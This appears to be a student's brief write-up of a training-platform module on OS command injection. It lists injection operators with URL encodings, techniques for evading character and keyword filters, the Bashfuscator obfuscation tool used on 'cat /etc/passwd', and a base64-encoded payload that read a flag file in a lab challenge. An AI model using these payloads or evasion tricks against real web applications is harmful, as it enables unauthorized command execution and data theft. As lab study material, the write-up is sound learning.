# Academy - Command Injection  

Overall, I think this is not the best module. As a result, I am going to keep this writeup very brief. 

<br />

## Operators for Injection  

These are the Operators that cause multiple commands to be run:  
(The "Command Executed column indicated which of the commands on each side of the operator is run):  

| Operator | Url-Encoded | Command Executed                           |
|  ------- |   -------   |     --------------------------------       | 
|   `;`    |    `%3b`    |   Both                                     |
|   `\n`   |    `%0a`    |   Both                                     |
|   `&`    |    `%26`    |   Both (second output usually shown first) |
|   `\|`   |    `%7c`    |   Both (only second output shown)          |
|   `&&`   |    `%26%26` |   Both (only if first suceeds)             |
|  `\|\|`  |    `%7c%7c` |   First, Second (only if first fails)      |
| ``` `` ``` |    `%60%60` |   Both (Linux-only)                        |
|   `$()`  | `%24%28%29` |   Both (Linux only)                        |

<br />

## Bypassing Front-End Validation

We can look at the network tab of command line tools and see that there was no GET or POST request actually sent, meaning the input validation was being done in the front end.  

If Front-End validation is occuring, you should be able to just modify the request in Burp, to bypass the validation. 

<br />

## Bypassing Character Filters

Characters like `[space]` `\` `/` `;` `&` `|` are often filtered out of input  

These are some of the many ways to bypass filters for different characters:  

### Spaces:

The newline character `\n` or url-encoded: `%0a` is often not blacklisted, and can be used to append an extra command in both Windows and Linux and can therefore maybe be used as an injection operator  

The tab character (`%09`) can also sometimes be used  

Using the `$IFS` Linux environment variable may work to bypass space filters because its default value is a space and a tab  

Bash brace (`{}`) expansion:  
In bash, `{ls,-la,/}` is equivalent to `ls -la /`

This page has some more ways to write commands without spaces:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space  

### Using Environment Variables:  

We can use environment variables, to get characters in our payload  
For example, if `/` was filtered, we could use Linux environment variables to get it:  
For example, the `PATH` variable might be `/usr/local/bin:/usr/bin:/bin:/usr/games`  
We could use `${PATH:0:1}` to get just that first `/`  
This also might work with the `HOME` or `PWD` environment variables  
Similarly, to get a `;` on most Linux targets, we could do: `${LS_COLORS:10:1}`  

The same concept can apply with Windows environment variables:
`$env:HOMEPATH[0]` will get us a `\`  
We can use the `Get-ChildItem Env:` Powershell command to show all of the environment variables, and select characters we need from them  
For instance, I was able to find `$env:PATHEXT[4]` from this which gets me a `;`  

### Character Shifting
This will output a `/` : `echo $(tr '!-}' '"-~'<<<[)`  

### Character Filters Bypass Example:

I was able to use:  
`127.0.0.1%0a{ls,-la,${PATH:0:1}home}`  
to list the `/home` directory for one of the challenges  

<br />

## Bypassing Command Filters  

Sometimes certain words, that are commands (e.g `whoami`) will be filtered out of input  

Linux and Windows:  
- `wh'o'am'i'` or `wh"o"am"i"` instead of `whoami`  
    - Cannot mix types of quotes, number of quotes must be even

Linux Only:  
- `who$@ami` or `w\ho\am\i`  

Windows Only:  
- `who^ami` or `WhOaMi`  

Linux Case Manipulation equivalent:  
- Unlike Windows, Linux/bash shell is case-sensitive. The following work though:  
    - `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
    - `$(a="WhOaMi";printf %s "${a,,}")`

Reversed Commands:  
- Linux: `$(rev<<<'imaohw')`  
- Windows: `iex "$('imaohw'[-1..-20] -join '')"`  

Encoded Commands:  
- Linux:  
    - `echo -n 'whoami' | base64`  
    - `bash<<<$(base64 -d<<<d2hvYW1p)`  
    - Note: we are using `<<<` to avoid using `|` which might be a filtered character
- Windows:
    - `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`  
    - `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`  

<br />

## Evasion Tools  

**Bashfuscator (Linux)**  
- `git clone https://github.com/Bashfuscator/Bashfuscator`  
- `cd Bashfuscator`  
- `python3 setup.py install --user`  
- `./bashfuscator/bin/bashfuscator -h`  
- `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`  

**DOSfuscation (Windows)**  

<br />

## Skills Assesment

There was an injectable move file request in a tiny file manager webapp  
To cat `/flag.txt` we injected with the following (`%7c` is url-encoded `|`):  
- `echo -n 'cat ${PATH:0:1}flag.txt' | base64`  
- `%7c%7cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)`



